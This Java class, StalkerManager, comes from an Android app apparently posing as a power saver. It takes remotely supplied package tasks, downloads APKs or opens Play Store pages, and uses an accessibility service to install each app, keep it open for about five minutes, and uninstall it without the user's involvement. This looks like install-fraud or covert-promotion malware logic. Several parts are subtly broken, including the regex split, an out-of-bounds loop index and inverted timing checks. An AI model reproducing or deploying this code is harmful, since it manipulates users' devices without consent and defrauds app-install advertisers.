package com.luna.powersaver.gp.manager;

import android.text.TextUtils;

import com.luna.powersaver.gp.common.StaticConst;
import com.luna.powersaver.gp.entity.JsonAppInfo;
import com.luna.powersaver.gp.http.DownloadManager;
import com.luna.powersaver.gp.http.bean.DownloadInfo;
import com.luna.powersaver.gp.service.NBAccessibilityService;
import com.luna.powersaver.gp.utils.AppDebugLog;
import com.luna.powersaver.gp.utils.AppInfoUtil;
import com.luna.powersaver.gp.utils.DBUtil;

import java.util.ArrayList;
import java.util.HashMap;

/**
 * 为了操作方便，暂时实行同一时间一个任务 <br />
 * 此处工作基本都在线程执行 <br />
 * Created by zsigui on 17-1-18.
 */

public class StalkerManager implements DownloadInfo.DownloadListener {

    private static StalkerManager sInstance;

    public static StalkerManager get() {
        if (sInstance == null) {
            sInstance = new StalkerManager();
        }
        return sInstance;
    }

//    /**
//     * 存放等待下载任务列表
//     */
//    private HashMap<String, JsonAppInfo> sWaitToDownloadMap = new HashMap<>();
//    /**
//     * 存在下载中的任务列表
//     */
//    private HashMap<String, JsonAppInfo> sDownloadingMap = new HashMap<>();
//    /**
//     * 存在等待安装的任务列表
//     */
//    private HashMap<String, JsonAppInfo> sWaitToInstallMap = new HashMap<>();
//    /**
//     * 存放已安装的任务列表，后期可能任务打开之类的
//     */
//    private HashMap<String, JsonAppInfo> sInstalledMap = new HashMap<>();
//    /**
//     * 存放已完成的任务列表
//     */
//    private HashSet<String> sFinishedSet = new HashSet<>();

    private static final int DEFAULT_OPEN_TIME = 5 * 60;
    /**
     * 当前正在执行的任务
     */
    public static JsonAppInfo sCurrentWorkInfo;
    // 全部任务列表
    private HashMap<String, JsonAppInfo> sTotalMap = new HashMap<>();
    private ArrayList<JsonAppInfo> sWaitingList = new ArrayList<>();

    /**
     * 移除废除的任务
     */
    public void removeOldTask(String oldpkgs) {
        if (TextUtils.isEmpty(oldpkgs)) {
            return;
        }
        String[] oldpkgArr = oldpkgs.split("|");
        JsonAppInfo tmp;
        for (String pkg : oldpkgArr) {
//            sWaitToDownloadMap.remove(pkg);
//            tmp = sDownloadingMap.remove(pkg);
//            if (tmp == null) {
//                tmp = sWaitToInstallMap.remove(pkg);
//            } else {
//                sWaitToInstallMap.remove(pkg);
//            }
//            sInstalledMap.remove(pkg);
//            if (tmp != null) {
//                // 删除下载中的任务
//                DownloadManager.getInstance(StaticConst.sContext).removeDownload(
//                        DownloadManager.getInstance(StaticConst.sContext).getInfoByPackageName(pkg), true
//                );
//            }
            if (TextUtils.isEmpty(pkg))
                continue;

            if (sCurrentWorkInfo != null && sCurrentWorkInfo.pkg.equals(pkg)) {
                // 当前任务需要废除
                sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DISCARD;
                sCurrentWorkInfo = null;
                DBUtil.setWorkingInfo(null);
            }
            // totalMap 跟 finishedSet 不废除，保留记录？
            for (int i = sWaitingList.size(); i > 0; i--) {
                tmp = sWaitingList.get(i);
                if (tmp == null) {
                    sWaitingList.remove(i);
                } else if (pkg.equals(tmp.pkg)) {
                    sWaitingList.remove(i);
                    sTotalMap.remove(pkg);
                }
            }
        }
    }

    /**
     * 判断并添加新增的任务
     */
    public void addNewTask(ArrayList<JsonAppInfo> newpkgs) {
        JsonAppInfo old;
        for (JsonAppInfo info : newpkgs) {
            if (info == null)
                continue;
            old = sTotalMap.get(info.pkg);
            if (old == null) {
                sWaitingList.add(info);
                sTotalMap.put(info.pkg, info);
            } else {
                if (old.execState != JsonAppInfo.EXC_STATE.FINISHED
                        || (old.endtime < info.starttime)) {
                    // 任务没完成或者需要重置
                    old.starttime = info.starttime;
                    old.endtime = info.endtime;
                    old.task = info.task;
                    if (old.execState != JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD) {
                        sWaitingList.add(old);
                    }
                    old.execState = JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD;
                }
            }
        }
    }

    public void fromWaitDownloadToDownloading(String packName) {
//        JsonAppInfo info = sWaitToDownloadMap.remove(packName);
//        if (info != null) {
//            sDownloadingMap.put(packName, info);
//        }
    }

    public void fromDownloadingToDownloaded(String packName) {
//        JsonAppInfo info = sDownloadingMap.remove(packName);
//        if (info != null) {
//            sWaitToInstallMap.put(packName, info);
//        }
    }

    public void fromDownloadedToInstalled(String packName) {
//        JsonAppInfo info = sWaitToInstallMap.remove(packName);
//        if (info != null) {
//            sInstalledMap.put(packName, info);
//        }
    }

    public void fromInstalledToFinished(String packName) {
//        sInstalledMap.remove(packName);
//        sFinishedSet.add(packName);
    }

    public void doStartAfterShowView() {
    }

    /**
     * 实际开始执行任务，
     */
    public void doStart() {

        if (sCurrentWorkInfo != null) {
            // 确保一致
            sCurrentWorkInfo = sTotalMap.get(sCurrentWorkInfo.pkg);
            if (sCurrentWorkInfo != null) {
                switch (sCurrentWorkInfo.execState) {
                    case JsonAppInfo.EXC_STATE.WAIT_TO_DOWNLOAD:
                    case JsonAppInfo.EXC_STATE.DOWNLOADING:
                    case JsonAppInfo.EXC_STATE.DOWNLOADED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, sCurrentWorkInfo.pkg)) {
                            // 已经安装了，转换状态
                            doContinueAfterInstalled();
                        }
                        return;
                    case JsonAppInfo.EXC_STATE.INSTALLED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, sCurrentWorkInfo.pkg)) {
                            doContinueAfterInstalled();
                        }
                        return;
                    case JsonAppInfo.EXC_STATE.OPENED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, sCurrentWorkInfo.pkg)) {
                            doContinueAfterOpened();
                        }
                        return;
                    case JsonAppInfo.EXC_STATE.FINISHED:
                        if (AppInfoUtil.isPkgInstalled(StaticConst.sContext, sCurrentWorkInfo.pkg)) {
                            sCurrentWorkInfo = null;
                        }
                        break;
                }
            }
        }

        // 处理 sCurrentWorkInfo
        int i = sWaitingList.size() - 1;
        JsonAppInfo info;
        long curTime = System.currentTimeMillis() / 1000;

        info = sWaitingList.get(i);
        while (i > -1) {
            if (info == null) {
                sWaitingList.remove(i);
            } else if (curTime >= info.endtime) {
                // 已经超时，任务废弃
                sWaitingList.remove(i);
                info.execState = JsonAppInfo.EXC_STATE.DISCARD;
            } else if (curTime > info.starttime) {
                // 还没到可以执行的时候，跳过
                break;
            }
            info = sWaitingList.get(--i);
        }
        if (info == null) {
            // 没有合适的任务，退出
            return;
        }

        sCurrentWorkInfo = info;
        NBAccessibilityService.sIsInWork = true;
        if (sCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
            // 开始下载
            DownloadInfo downloadInfo = new DownloadInfo();
            downloadInfo.setDownloadUrl(sCurrentWorkInfo.url);
            downloadInfo.setDestUrl(sCurrentWorkInfo.url);
            downloadInfo.setPackageName(sCurrentWorkInfo.pkg);
            DownloadManager.getInstance(StaticConst.sContext).startDownload(downloadInfo);
            // 需要等下载完之后回调
            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.IGNORED;
        } else if (sCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_GP) {
            NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
            AppInfoUtil.jumpToStore(StaticConst.sContext, sCurrentWorkInfo.pkg);
        }
        sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADING;
    }

    /**
     * 卸载完成后执行下一个任务
     */
    public void doContinueAfterUninstall() {
        // 卸载之后，则开始执行下一个任务
        if (sCurrentWorkInfo != null) {
            fromInstalledToFinished(sCurrentWorkInfo.pkg);
            sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
            sCurrentWorkInfo = null;
        }
        doStart();
    }

    /**
     * 当APP检测已经安装，执行该步骤
     */
    public void doContinueAfterInstalled() {
        if (sCurrentWorkInfo == null) {
            doStart();
            return;
        }
        sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.INSTALLED;
        switch (sCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                if (sCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(sCurrentWorkInfo.pkg);
                    info.setDownloadUrl(sCurrentWorkInfo.url);
                    info.setDestUrl(sCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.uninstall(StaticConst.sContext, sCurrentWorkInfo.pkg);
                }
                // 安装后不打开立即卸载
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.jumpToApp(StaticConst.sContext, sCurrentWorkInfo.pkg);
                    // 开启后台计时服务
                }
                break;
        }
    }

    /**
     * 处理APP打开过后的操作（根据累计时间继续打开或者下载完成等）
     */
    public void doContinueAfterOpened() {
        if (sCurrentWorkInfo == null) {
            doStart();
            return;
        }
        sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.OPENED;
        switch (sCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 一般该状态到不了这里
                if (sCurrentWorkInfo.task == JsonAppInfo.TASK.DOWNLOAD_BY_APK) {
                    DownloadInfo info = new DownloadInfo();
                    info.setPackageName(sCurrentWorkInfo.pkg);
                    info.setDownloadUrl(sCurrentWorkInfo.url);
                    info.setDestUrl(sCurrentWorkInfo.url);
                    // 删除可能存在的包，不做其他操作
                    DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                }
                sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                sCurrentWorkInfo = null;
                doStart();
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 一般该状态到不了这里
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.uninstall(StaticConst.sContext, sCurrentWorkInfo.pkg);
                    sCurrentWorkInfo = null;
                    doStart();
                }
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
                if (sCurrentWorkInfo.opentime > DEFAULT_OPEN_TIME) {
                    sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                    sCurrentWorkInfo = null;
                    doStart();
                } else {
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.OPEN_MANUALLY;
                    if (NBAccessibilityService.sIsInWork) {
                        AppInfoUtil.jumpToApp(StaticConst.sContext, sCurrentWorkInfo.pkg);
                        // 开启后台计时服务
                    }
                }
                break;
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                if (sCurrentWorkInfo.opentime > DEFAULT_OPEN_TIME) {
                    AppInfoUtil.uninstall(StaticConst.sContext, sCurrentWorkInfo.pkg);
                    NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.UNINSTALL_MANUALLY;
                } else {
                    if (NBAccessibilityService.sIsInWork) {
                        AppInfoUtil.jumpToApp(StaticConst.sContext, sCurrentWorkInfo.pkg);
                        // 开启后台计时服务
                    }
                }
                break;
        }
    }

    /**
     * 下载完成后处理，由于通过GP会直接跳转安装完成，则GP下载该步是忽略的
     *
     * @param info
     */
    public void doContinueAfterDownloaded(DownloadInfo info) {
        if (sCurrentWorkInfo == null) {
            doStart();
            return;
        }

        switch (sCurrentWorkInfo.keepstate) {
            case JsonAppInfo.KEEP_STATE.NOT_WORK:
                // 删除包，然后不做其他操作
                DownloadManager.getInstance(StaticConst.sContext).removeDownloadFile(info, true);
                sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.FINISHED;
                break;
            case JsonAppInfo.KEEP_STATE.UNINSTALL_INSTANT:
                // 安装后不打开立即卸载
            case JsonAppInfo.KEEP_STATE.UNINSTALL_AFTER_OPEN:
            case JsonAppInfo.KEEP_STATE.NOT_WORK_AFTER_OPEN:
                if (NBAccessibilityService.sIsInWork) {
                    AppInfoUtil.install(StaticConst.sContext,
                            DownloadManager.getInstance(StaticConst.sContext).getDownloadFile(info));
                }
                NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.INSTALL_MANUALLY;
                break;
        }
    }

    public void doContinueAfterSearch() {
        NBAccessibilityService.sCurrentWorkType = NBAccessibilityService.TYPE.DOWNLOAD_BY_GP;
    }

    @Override
    public void onProgressUpdate(DownloadInfo info, int elapsedTime) {

    }

    @Override
    public void onFinishDownload(DownloadInfo info) {
        sCurrentWorkInfo.execState = JsonAppInfo.EXC_STATE.DOWNLOADED;
        doContinueAfterDownloaded(info);
    }

    @Override
    public void onFailDownload(DownloadInfo info, String err) {
        // 下载失败，重置或者废弃？
        AppDebugLog.d(AppDebugLog.TAG_DEBUG_INFO, "下载失败: " + info.getPackageName() + ", url = "
                + info.getDownloadUrl() + ", err = " + err);
    }
}
